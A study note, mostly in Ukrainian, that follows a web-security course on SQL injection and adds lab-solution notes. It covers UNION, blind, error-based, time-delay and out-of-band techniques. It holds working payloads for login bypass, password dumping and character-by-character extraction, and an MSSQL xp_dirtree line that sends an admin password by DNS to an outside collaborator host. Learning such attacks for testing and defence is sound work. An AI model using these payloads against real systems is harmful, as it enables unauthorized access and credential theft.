## What is SQL injection (SQLi)?

SQL-інʼєкція (SQLi) — це вразливість веббезпеки, яка дозволяє зловмиснику втручатися в запити, які застосунок надсилає до своєї бази даних. Це може дозволити зловмиснику переглядати дані, які зазвичай йому недоступні. До них можуть належати дані інших користувачів або будь-які інші дані, до яких застосунок має доступ. У багатьох випадках зловмисник може змінювати або видаляти ці дані, спричиняючи постійні зміни у вмісті або поведінці застосунку.

У деяких ситуаціях зловмисник може розширити атаку SQL-інʼєкції до компрометації базового сервера або іншої серверної інфраструктури. Також це може дозволити йому виконувати атаки типу відмови в обслуговуванні (denial-of-service).

## What is the impact of a successful SQL injection attack?

Успішна атака SQL-інʼєкції може призвести до несанкціонованого доступу до чутливих даних, таких як:

- Паролі.
    
- Дані кредитних карток.
    
- Персональна інформація користувачів.
    
Атаки SQL-інʼєкції протягом багатьох років використовувалися у численних гучних витоках даних. Це призводило до репутаційних втрат і регуляторних штрафів. У деяких випадках зловмисник може отримати постійний бекдор у системи організації, що призводить до довготривалої компрометації, яка може залишатися непоміченою протягом тривалого часу.

## How to detect SQL injection vulnerabilities

Ви можете виявляти SQL-інʼєкції вручну, використовуючи систематичний набір тестів для кожної точки введення в застосунку. Для цього зазвичай надсилають:

- Символ одинарної лапки `'` і перевіряють на наявність помилок або інших аномалій.
    
- Деякий SQL-специфічний синтаксис, який обчислюється до базового (початкового) значення точки введення та до іншого значення, і перевіряють на систематичні відмінності у відповідях застосунку.
    
- Булеві умови, такі як `OR 1=1` і `OR 1=2`, та шукають відмінності у відповідях застосунку.
    
- Пейлоади, призначені для ініціювання часових затримок під час виконання в SQL-запиті, і перевіряють відмінності в часі відповіді.
    
- OAST-пейлоади, призначені для ініціювання позасмугової мережевої взаємодії під час виконання в SQL-запиті, та відстежують будь-які взаємодії, що виникають у результаті.
## SQL injection in different parts of the query

Більшість вразливостей SQL-інʼєкції виникає в операторі **WHERE** запиту **SELECT**. Більшість досвідчених тестувальників добре знайомі з цим типом SQL-інʼєкції.

Однак вразливості SQL-інʼєкції можуть виникати в будь-якому місці запиту та в різних типах запитів. Деякі інші поширені місця, де виникає SQL-інʼєкція, включають:

- В операторах **UPDATE** — у значеннях, що оновлюються, або в операторі **WHERE**.
    
- В операторах **INSERT** — у значеннях, що вставляються.
    
- В операторах **SELECT** — у назві таблиці або стовпця.
    
- В операторах **SELECT** — в операторі **ORDER BY**.

## SQL injection examples

Існує багато вразливостей, атак і технік SQL-інʼєкції, які виникають у різних ситуаціях. Деякі поширені приклади SQL-інʼєкцій включають:

- **Retrieving hidden data**, коли ви можете змінити SQL-запит так, щоб він повертав додаткові результати.
    
- **Subverting(порушення) application logic**, коли ви можете змінити запит, щоб втрутитися в логіку роботи застосунку.
    
- **UNION attacks**, коли ви можете отримувати дані з різних таблиць бази даних.
    
- **Blind SQL injection**, коли результати контрольованого вами запиту не повертаються у відповідях застосунку.
## Retrieving hidden data

Уявіть собі застосунок для покупок, який відображає товари в різних категоріях. Коли користувач натискає на категорію **Gifts**, його браузер надсилає запит за URL:
```
https://insecure-website.com/products?category=Gifts
```
Це змушує застосунок виконати SQL-запит для отримання деталей відповідних товарів із бази даних:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Цей SQL-запит просить базу даних повернути:

- усі деталі (`*`)
    
- з таблиці `products`
    
- де категорія — `Gifts`
    
- і значення `released` дорівнює 1.
    

Обмеження `released = 1` використовується для приховування товарів, які ще не опубліковані. Можна припустити, що для неопублікованих товарів `released = 0`.

Застосунок не реалізує жодних механізмів захисту від атак SQL-інʼєкції. Це означає, що зловмисник може, наприклад, сформувати таку атаку:
```
https://insecure-website.com/products?category=Gifts'--
```
У результаті формується SQL-запит:
```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Ключовим моментом є те, що `--` є індикатором коментаря в SQL. Це означає, що решта запиту інтерпретується як коментар і фактично ігнорується. У цьому прикладі це означає, що запит більше не містить умови `AND released = 1`. У результаті відображаються всі товари, включно з тими, які ще не були опубліковані.

Ви можете використати подібну атаку, щоб змусити застосунок відобразити всі товари в будь-якій категорії, включно з категоріями, про які він навіть «не знає»:
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
Це призводить до такого SQL-запиту:
```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
Змінений запит повертає всі елементи, де або категорія — `Gifts`, або `1` дорівнює `1`. Оскільки умова `1=1` завжди є істинною, запит повертає всі елементи.

## Subverting application logic

Уявіть собі застосунок, який дозволяє користувачам входити в систему за допомогою імені користувача та пароля. Якщо користувач надсилає імʼя користувача `wiener` і пароль `bluecheese`, застосунок перевіряє облікові дані, виконуючи такий SQL-запит:
```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
Якщо запит повертає дані користувача, вхід вважається успішним. В іншому випадку доступ відхиляється.

У цьому випадку зловмисник може увійти в систему під будь-яким користувачем без необхідності знати пароль. Він може зробити це, використовуючи послідовність SQL-коментаря `--`, щоб прибрати перевірку пароля з оператора **WHERE** запиту. Наприклад, надсилання імені користувача `administrator'--` і порожнього пароля призводить до такого запиту:
```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
Цей запит повертає користувача з імʼям `administrator` і успішно авторизує зловмисника під цим обліковим записом.

## Retrieving data from other database tables

У випадках, коли застосунок повертає у відповіді результати SQL-запиту, зловмисник може використати вразливість SQL-інʼєкції для отримання даних з інших таблиць бази даних. Для цього можна використати ключове слово **UNION**, щоб виконати додатковий запит **SELECT** і додати його результати до початкового запиту.

Наприклад, якщо застосунок виконує такий запит, що містить користувацький ввід `Gifts`:
```
SELECT name, description FROM products WHERE category = 'Gifts'
```
Зловмисник може надіслати такий ввід:
```
' UNION SELECT username, password FROM users--
```
Це призводить до того, що застосунок повертає всі імена користувачів і паролі разом з назвами та описами товарів.

# SQL injection UNION attacks

Коли застосунок є вразливим до SQL-інʼєкції і результати запиту повертаються у відповідях застосунку, ви можете використати ключове слово **UNION** для отримання даних з інших таблиць бази даних. Це зазвичай називають **UNION-атакою SQL-інʼєкції**.

Ключове слово **UNION** дозволяє виконувати один або кілька додаткових запитів **SELECT** і приєднувати їхні результати до початкового запиту. Наприклад:
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
Цей SQL-запит повертає єдиний набір результатів із двома стовпцями, що містять значення зі стовпців `a` і `b` таблиці `table1` та зі стовпців `c` і `d` таблиці `table2`.

Щоб UNION-запит працював, повинні виконуватися дві ключові умови:

- Окремі запити повинні повертати однакову кількість стовпців.
    
- Типи даних у кожному стовпці мають бути сумісними між окремими запитами.
    

Для проведення UNION-атаки SQL-інʼєкції необхідно переконатися, що ваша атака відповідає цим двом вимогам. Зазвичай це передбачає зʼясування:

- Скільки стовпців повертає початковий запит.
    
- Які зі стовпців, що повертаються початковим запитом, мають відповідний тип даних для збереження результатів інʼєктованого запиту.
## Determining the number of columns required

Під час виконання UNION-атаки SQL-інʼєкції існують два ефективні методи визначення кількості стовпців, які повертає початковий запит.

Перший метод полягає в інʼєкції серії операторів **ORDER BY** із поступовим збільшенням індексу стовпця доти, доки не виникне помилка. Наприклад, якщо точка інʼєкції знаходиться всередині рядка в операторі **WHERE** початкового запиту, ви надсилатимете:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
і так далі.

Ця серія пейлоадів змінює початковий запит так, що результати впорядковуються за різними стовпцями у наборі результатів. Стовпець в операторі **ORDER BY** може бути заданий за допомогою його індексу, тому вам не потрібно знати назви жодних стовпців. Коли вказаний індекс стовпця перевищує фактичну кількість стовпців у наборі результатів, база даних повертає помилку, наприклад:
```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```
Застосунок може фактично повернути помилку бази даних у своїй HTTP-відповіді, але також може видати загальну помилку. В інших випадках він може просто не повернути жодних результатів. У будь-якому випадку, якщо ви можете виявити будь-яку різницю у відповіді, ви можете зробити висновок про кількість стовпців, які повертає запит.

Другий метод полягає в надсиланні серії пейлоадів **UNION SELECT** з різною кількістю значень **NULL**:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
і так далі.

Якщо кількість значень **NULL** не відповідає кількості стовпців, база даних повертає помилку, наприклад:
```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```
Ми використовуємо **NULL** як значення, що повертаються інʼєктованим запитом **SELECT**, оскільки типи даних у кожному стовпці повинні бути сумісними між початковим та інʼєктованим запитами. **NULL** можна привести до будь-якого поширеного типу даних, тому це максимально підвищує ймовірність успіху пейлоада, коли кількість стовпців є правильною.

Як і у випадку з технікою **ORDER BY**, застосунок може фактично повернути помилку бази даних у HTTP-відповіді, але може також повернути загальну помилку або просто не повернути жодних результатів. Коли кількість **NULL** збігається з кількістю стовпців, база даних повертає додатковий рядок у наборі результатів, що містить значення **NULL** у кожному стовпці. Вплив на HTTP-відповідь залежить від коду застосунку. Якщо вам пощастить, ви побачите додатковий вміст у відповіді, наприклад, ще один рядок у HTML-таблиці. В іншому випадку значення **NULL** можуть спричинити іншу помилку, наприклад **NullPointerException**. У найгіршому випадку відповідь може виглядати так само, як і відповідь, викликана неправильною кількістю **NULL**, що зробить цей метод неефективним.
## Database-specific syntax

В Oracle кожен запит **SELECT** повинен використовувати ключове слово **FROM** і вказувати коректну таблицю. В Oracle існує вбудована таблиця під назвою **dual**, яку можна використовувати для цієї мети. Тому інʼєктовані запити в Oracle повинні виглядати так:
```
' UNION SELECT NULL FROM DUAL--
```
Описані пейлоади використовують послідовність коментаря з подвійного дефіса **--**, щоб закоментувати решту початкового запиту після точки інʼєкції. У MySQL послідовність подвійного дефіса **--** повинна супроводжуватися пробілом. Як альтернативу, для позначення коментаря можна використовувати символ решітки **#**.

For more details of database-specific syntax, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
## Finding columns with a useful data type

UNION‑атака SQL‑інʼєкції дозволяє отримувати результати з інʼєктованого запиту. Цікаві дані, які ви зазвичай хочете отримати, мають рядкову форму. Це означає, що вам потрібно знайти один або декілька стовпців у результатах початкового запиту, тип даних яких є рядковим або сумісним із рядковими даними.

Після того як ви визначили необхідну кількість стовпців, можна перевірити кожен стовпець, щоб зʼясувати, чи може він містити рядкові дані. Для цього ви можете надіслати серію пейлоадів **UNION SELECT**, які по черзі розміщують рядкове значення в кожному зі стовпців. Наприклад, якщо запит повертає чотири стовпці, ви надішлете:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
Якщо тип даних стовпця не сумісний із рядковими даними, інʼєктований запит спричинить помилку бази даних, наприклад:
```
Conversion failed when converting the varchar value 'a' to data type int.
```
Якщо помилка не виникає, і відповідь застосунку містить додатковий вміст, включно з інʼєктованим рядковим значенням, то відповідний стовпець підходить для отримання рядкових даних.

## Using a SQL injection UNION attack to retrieve interesting data

Коли ви визначили кількість стовпців, які повертає початковий запит, і зʼясували, які з цих стовпців можуть містити рядкові дані, ви отримуєте можливість витягувати цікаві дані.

Припустимо, що:

- Початковий запит повертає два стовпці, обидва з яких можуть містити рядкові дані.
    
- Точка інʼєкції знаходиться всередині рядкового значення в умові **WHERE**.
    
- База даних містить таблицю **users** зі стовпцями **username** та **password**.
    

У цьому прикладі ви можете отримати вміст таблиці **users**, надіславши такий ввід:
```
' UNION SELECT username, password FROM users--
```
Щоб виконати цю атаку, вам потрібно знати, що існує таблиця **users** з двома стовпцями **username** та **password**. Без цієї інформації довелося б вгадувати назви таблиць і стовпців. Усі сучасні бази даних надають способи дослідження структури бази даних і визначення того, які таблиці та стовпці вона містить.

## Retrieving multiple values within a single column

У деяких випадках запит із попереднього прикладу може повертати лише один стовпець.

Ви можете отримати кілька значень разом у цьому одному стовпці, об’єднавши їх. Ви можете додати роздільник, щоб мати змогу відрізнити об’єднані значення. Наприклад, в Oracle ви можете надіслати такий ввід:
```
' UNION SELECT username || '~' || password FROM users--
```
Тут використовується подвійна вертикальна риска `||`, яка в Oracle є оператором конкатенації рядків. Інʼєкційний запит обʼєднує значення полів **username** та **password**, розділяючи їх символом `~`.

Результати запиту містять усі імена користувачів і паролі, наприклад:
```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```
Різні бази даних використовують різний синтаксис для конкатенації рядків. 
# Blind SQL injection
## What is blind SQL injection?

Сліпа SQL-інʼєкція (Blind SQL injection) виникає тоді, коли застосунок є вразливим до SQL-інʼєкції, але його HTTP-відповіді не містять результатів відповідного SQL-запиту або деталей будь-яких помилок бази даних.

Багато технік, таких як UNION-атаки, є неефективними у випадку сліпих SQL-інʼєкцій. Це повʼязано з тим, що вони залежать від можливості бачити результати інʼєкційного запиту у відповідях застосунку. Проте все ще можливо експлуатувати сліпу SQL-інʼєкцію для отримання несанкціонованого доступу до даних, але для цього необхідно використовувати інші техніки.
## Exploiting blind SQL injection by triggering conditional responses

Розгляньмо застосунок, який використовує cookies для відстеження з метою збору аналітики використання. Запити до застосунку містять заголовок cookie приблизно такого вигляду:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
Коли запит, що містить cookie `TrackingId`, обробляється, застосунок використовує SQL-запит, щоб визначити, чи є це відомий користувач:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
Цей запит є вразливим до SQL-інʼєкції, але результати запиту не повертаються користувачеві. Однак застосунок поводиться по-різному залежно від того, чи повертає запит якісь дані. Якщо ви надсилаєте розпізнаний `TrackingId`, запит повертає дані, і у відповіді ви отримуєте повідомлення **«Welcome back»**.

Такої поведінки достатньо, щоб мати змогу експлуатувати вразливість сліпої SQL-інʼєкції. Ви можете отримувати інформацію, умовно викликаючи різні відповіді залежно від інʼєкованої умови.

Щоб зрозуміти, як працює ця експлуатація, припустімо, що послідовно надсилаються два запити з такими значеннями cookie `TrackingId`:
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
Перше з цих значень змушує запит повертати результати, оскільки інʼєкована умова `AND '1'='1` є істинною. У результаті відображається повідомлення **«Welcome back»**.  
Друге значення змушує запит не повертати жодних результатів, оскільки інʼєкована умова є хибною. Повідомлення **«Welcome back»** не відображається.

Це дозволяє нам визначати результат будь-якої окремої інʼєкованої умови та витягувати дані по частинах.

Наприклад, припустімо, що існує таблиця `Users` зі стовпцями `Username` і `Password`, а також користувач з імʼям `Administrator`. Ви можете визначити пароль цього користувача, надсилаючи серію запитів для перевірки пароля символ за символом.

Для цього почніть із такого вводу:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
Цей запит повертає повідомлення **«Welcome back»**, що означає, що інʼєкована умова є істинною, і, отже, перший символ пароля є більшим за `m`.

Далі надсилаємо такий ввід:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
Цей запит не повертає повідомлення **«Welcome back»**, що означає, що інʼєкована умова є хибною, і, отже, перший символ пароля не є більшим за `t`.

Зрештою ми надсилаємо такий ввід, який повертає повідомлення **«Welcome back»**, тим самим підтверджуючи, що перший символ пароля — це `s`:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
Ми можемо продовжувати цей процес, щоб систематично визначити повний пароль користувача **Administrator**.

## Error-based SQL injection

SQL-інʼєкція на основі помилок (error-based SQL injection) стосується випадків, коли ви можете використовувати повідомлення про помилки для **отримання або виведення чутливої інформації з бази даних**, навіть у сліпих (blind) контекстах. Можливості залежать від конфігурації бази даних і типів помилок, які ви здатні викликати.

- Ви можете змусити застосунок повертати **конкретну помилку** залежно від результату булевого виразу.  
    
- Ви можете викликати **повідомлення про помилки, які виводять дані**, що повертаються SQL-запитом. Це фактично перетворює сліпі SQL-інʼєкції на видимі. 
### Exploiting blind SQL injection by triggering conditional errors

Деякі застосунки виконують SQL‑запити, але їхня поведінка **не змінюється незалежно від того, чи повертає запит якісь дані**. Техніка з попереднього розділу в такому випадку не працюватиме, оскільки інʼєкція різних булевих умов не призводить до жодної різниці у відповідях застосунку.

Часто можливо змусити застосунок повертати **різну відповідь залежно від того, чи виникає SQL‑помилка**. Ви можете змінити запит так, щоб він викликав помилку бази даних **лише у випадку, якщо умова є істинною**. Дуже часто необроблена помилка, згенерована базою даних, призводить до певної відмінності у HTTP‑відповіді застосунку, наприклад до повідомлення про помилку. Це дозволяє зробити висновок про істинність інʼєктованої умови.

Щоб побачити, як це працює, припустімо, що надсилаються два запити з такими значеннями cookie `TrackingId` по черзі:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Ці значення використовують ключове слово `CASE` для перевірки умови та повертають різний вираз залежно від того, чи є умова істинною:

- У першому випадку вираз `CASE` обчислюється як `'a'`, що **не викликає жодної помилки**.
    
- У другому випадку він обчислюється як `1/0`, що **викликає помилку ділення на нуль**.
    

Якщо ця помилка призводить до відмінності у HTTP‑відповіді застосунку, ви можете використати це, щоб визначити, чи є інʼєктована умова істинною.

Використовуючи цю техніку, ви можете отримувати дані, **перевіряючи по одному символу за раз**:
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
приклад синтаксису для оракла: 
```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
### Extracting sensitive data via verbose SQL error messages

Неправильна конфігурація бази даних іноді призводить до докладних (verbose) повідомлень про помилки. Вони можуть надавати інформацію, яка може бути корисною для зловмисника. Наприклад, розглянемо таке повідомлення про помилку, яке виникає після інʼєкції одинарної лапки в параметр `id`:
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
Це показує повний SQL‑запит, який застосунок сформував, використовуючи наше введення. Ми бачимо, що в цьому випадку ми виконуємо інʼєкцію всередину рядка в одинарних лапках у виразі `WHERE`. Це полегшує побудову коректного запиту, що містить шкідливий payload. Закоментування решти запиту запобігло б тому, щоб зайва одинарна лапка ламала синтаксис.

Іноді ви можете змусити застосунок згенерувати повідомлення про помилку, яке містить частину даних, що повертаються запитом. Це фактично перетворює інакше «сліпу» SQL‑інʼєкцію на видиму.

Для цього можна використати функцію `CAST()`. Вона дозволяє перетворювати один тип даних на інший. Наприклад, уявіть запит, що містить такий вираз:
```
CAST((SELECT example_column FROM example_table) AS int)
```
Часто дані, які ви намагаєтеся прочитати, є рядком. Спроба перетворити їх на несумісний тип даних, наприклад `int`, може викликати помилку, подібну до такої:
```
ERROR: invalid input syntax for type integer: "Example data"
```
Такий тип запиту також може бути корисним, якщо обмеження на кількість символів не дозволяє вам викликати умовні відповіді.

Як приклад ось:
```
' AND 1=CAST((SELECT username FROM users) AS int)--

далі отримуємо помилку вже від бази даних, що означає про правильний напрямок атаки

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

у відповідь отримали ERROR: invalid input syntax for type integer: "administrator", далі так само витягуємо пароль.

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
## Exploiting blind SQL injection by triggering time delays

Якщо застосунок перехоплює помилки бази даних під час виконання SQL‑запиту та коректно їх обробляє, у відповіді застосунку не буде жодної різниці. Це означає, що попередня техніка викликання умовних помилок не працюватиме.

У такій ситуації часто можна експлуатувати сліпу SQL‑інʼєкцію, викликаючи **часові затримки** залежно від того, чи є інʼєктована умова істинною або хибною. Оскільки SQL‑запити зазвичай обробляються застосунком **синхронно**, затримка виконання SQL‑запиту також затримує HTTP‑відповідь. Це дозволяє визначити істинність інʼєктованої умови за часом, необхідним для отримання HTTP‑відповіді.

Техніки викликання часової затримки залежать від типу використовуваної бази даних. Наприклад, у Microsoft SQL Server можна використати таке, щоб перевірити умову та викликати затримку залежно від того, чи є вираз істинним:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
Перше введення **не викликає затримки**, оскільки умова `1=2` є хибною.  
Друге введення **викликає затримку 10 секунд**, оскільки умова `1=1` є істинною.

Використовуючи цю техніку, ми можемо отримувати дані, перевіряючи **один символ за раз**:
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
## Exploiting blind SQL injection using out-of-band (OAST) techniques

Застосунок може виконувати той самий SQL-запит, що й у попередньому прикладі, але робити це **асинхронно**. Застосунок продовжує обробляти запит користувача в основному потоці, а для виконання SQL-запиту з використанням tracking-cookie застосовує **інший потік**. Запит усе ще є вразливим до SQL-інʼєкції, але **жодна з технік, описаних раніше, не працюватиме**. Відповідь застосунку не залежить від того:

- чи повертає запит якісь дані,
    
- чи виникає помилка бази даних,
    
- або скільки часу займає виконання запиту.
    

У такій ситуації часто можливо експлуатувати сліпу SQL-інʼєкцію, **викликаючи позасмугові (out-of-band) мережеві взаємодії** із системою, яку ви контролюєте. Ці взаємодії можуть викликатися залежно від інʼєктованої умови, щоб поетапно виводити інформацію. Ще корисніше те, що дані можна **безпосередньо ексфільтрувати** в межах мережевої взаємодії.

Для цього можна використовувати різні мережеві протоколи, але зазвичай **найефективнішим є DNS (система доменних імен)**. Багато продакшн-мереж дозволяють вільний вихід DNS-запитів, оскільки вони необхідні для нормальної роботи продакшн-систем.

Техніки викликання DNS-запиту залежать від типу використовуваної бази даних. Наприклад, у Microsoft SQL Server наступне введення може бути використане для виклику DNS-запиту до вказаного домену:
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Це змушує базу даних виконати DNS-запит до такого домену:
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Після того як ви підтвердили спосіб викликати **позасмугові (out-of-band)** взаємодії, ви можете використати цей канал для **витоку даних** із вразливого застосунку. Наприклад:

```
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Це введення:

- зчитує пароль користувача **Administrator**,
    
- додає унікальний піддомен Collaborator,
    
- викликає DNS-запит.
    

Цей DNS-запит дозволяє побачити перехоплений пароль:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Позасмугові (OAST) техніки є потужним способом виявлення та експлуатації **blind SQL injection**, оскільки вони мають високу ймовірність успіху та дозволяють **безпосередньо витягувати дані** через позасмуговий канал. З цієї причини OAST-техніки часто є кращим вибором навіть у тих ситуаціях, де інші методи blind-експлуатації також працюють.
## How to prevent blind SQL injection attacks?

Хоча техніки, необхідні для виявлення та експлуатації сліпих SQL-інʼєкцій, відрізняються і є більш складними, ніж у випадку звичайних SQL-інʼєкцій, заходи, необхідні для запобігання SQL-інʼєкціям, залишаються тими самими.

Як і у випадку зі звичайними SQL-інʼєкціями, атакам сліпих SQL-інʼєкцій можна запобігти шляхом обережного використання **параметризованих запитів**, які гарантують, що користувацьке введення не може втручатися у структуру запланованого SQL-запиту.

## Second-order SQL injection

**SQL-інʼєкція першого порядку** виникає тоді, коли застосунок обробляє користувацьке введення з HTTP-запиту та небезпечним чином вбудовує це введення в SQL-запит.

**SQL-інʼєкція другого порядку** виникає тоді, коли застосунок отримує користувацьке введення з HTTP-запиту та зберігає його для подальшого використання. Зазвичай це робиться шляхом запису введених даних у базу даних, але на етапі збереження вразливість не проявляється. Пізніше, під час обробки іншого HTTP-запиту, застосунок витягує збережені дані та небезпечним чином вбудовує їх у SQL-запит. З цієї причини SQL-інʼєкцію другого порядку також називають **збереженою (stored) SQL-інʼєкцією**.

SQL-інʼєкція другого порядку часто виникає в ситуаціях, коли розробники знають про вразливості SQL-інʼєкцій і тому безпечно обробляють початкове збереження введених даних у базі даних. Коли ж ці дані пізніше обробляються, їх вважають безпечними, оскільки раніше вони були коректно збережені в базі даних. На цьому етапі дані обробляються небезпечно, тому що розробник помилково вважає їх довіреними.

# Examining the database in SQL injection attacks

Деякі базові можливості мови SQL реалізовані однаково на популярних платформах баз даних, тому багато способів виявлення та експлуатації вразливостей SQL-інʼєкцій працюють однаково на різних типах баз даних.

Однак між поширеними базами даних також існує багато відмінностей. Це означає, що деякі техніки виявлення та експлуатації SQL-інʼєкцій працюють по-різному на різних платформах. Наприклад:

- синтаксис конкатенації рядків;
- коментарі;
- пакетні (або стекові) запити;
- платформо-специфічні API;
- повідомлення про помилки.

Після того як ви ідентифікували вразливість SQL-інʼєкції, часто корисно отримати інформацію про базу даних. Ця інформація може допомогти вам у подальшій експлуатації вразливості.

Ви можете запитати інформацію про версію бази даних. Для різних типів баз даних працюють різні методи. Це означає, що якщо вам вдається застосувати певний метод, ви можете зробити висновок про тип бази даних. Наприклад, в Oracle можна виконати:
```
SELECT * FROM v$version
```
Ви також можете визначити, які таблиці існують у базі даних і які стовпці вони містять. Наприклад, у більшості баз даних можна виконати такий запит, щоб отримати список таблиць:
```
SELECT * FROM information_schema.tables
```
## Querying the database type and version

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

Наприклад, ви можете використати UNION-атаку з таким введенням:
```
' UNION SELECT @@version--
```
Це може повернути такий результат. У цьому випадку ви можете підтвердити, що база даних - **Microsoft SQL Server**, а також побачити використану версію:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49

Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
Дивіться скільки рядків повертає запит, якщо два рядки, то потрібно вставляти ,NULL в селекті

## Listing the contents of the database

Більшість типів баз даних (крім Oracle) мають набір представлень (views), який називається **information schema**. Він надає інформацію про базу даних.

Наприклад, ви можете виконати запит до `information_schema.tables`, щоб отримати список таблиць у базі даних:
```
SELECT * FROM information_schema.tables
```
Це повертає приблизно такий результат:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
Цей вивід вказує на те, що існує три таблиці з назвами **Products**, **Users** і **Feedback**.

Потім ви можете виконати запит до `information_schema.columns`, щоб отримати список стовпців у конкретних таблицях:
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
Це повертає приблизно такий результат:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
Цей вивід показує стовпці у вказаній таблиці та тип даних кожного стовпця.

### Listing the contents of an Oracle database

On Oracle, you can find the same information as follows:

- You can list tables by querying `all_tables`:
    
    `SELECT * FROM all_tables`
    
- You can list columns by querying `all_tab_columns`:
    
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
приклади команд
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- дізнаємося назву таблиці

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- дізнаємося назви колонок таблиці

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- фінальний запит
```
ще приклад
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables-- всі таблиці

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- дізнаємося назви колонок таблиці

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- фінальний запит
```
## SQL injection in different contexts

До цього ми використовували **рядок запиту (query string)**, щоб вставити шкідливий SQL-payload. Однак SQL-інʼєкцію можна виконати **через будь-яке кероване введення**, яке додаток обробляє як SQL-запит. Наприклад, деякі вебсайти приймають введення у форматі **JSON або XML** і використовують його для запитів до бази даних.

Ці різні формати можуть надавати **різні способи обфускації атак**, які в іншому випадку були б заблоковані WAF або іншими механізмами захисту. Слабкі реалізації часто шукають **поширені ключові слова SQL-інʼєкцій** у запиті, тому інколи можна обійти такі фільтри, **кодувавши або екрануючи символи** в заборонених ключових словах. Наприклад, у наведеній нижче SQL-інʼєкції на основі XML використовується XML-escape-послідовність для кодування літери **S** у слові **SELECT**:
```
<stockCheck> 
   <productId>123</productId> 
   <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
```
Це буде **декодовано на стороні сервера** перед тим, як передатися SQL-інтерпретатору.

```
Hackvertor extension дуже допомагає в пентестингу

<storeId>1 UNION SELECT NULL або NULL,NULL</storeId> - обов'язково перевіряємо скільки рядків повертає

<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId> використовуємо конкатенацію(об'єднання декількох рядків) та енкодинг за допомогою нашого розширення
```
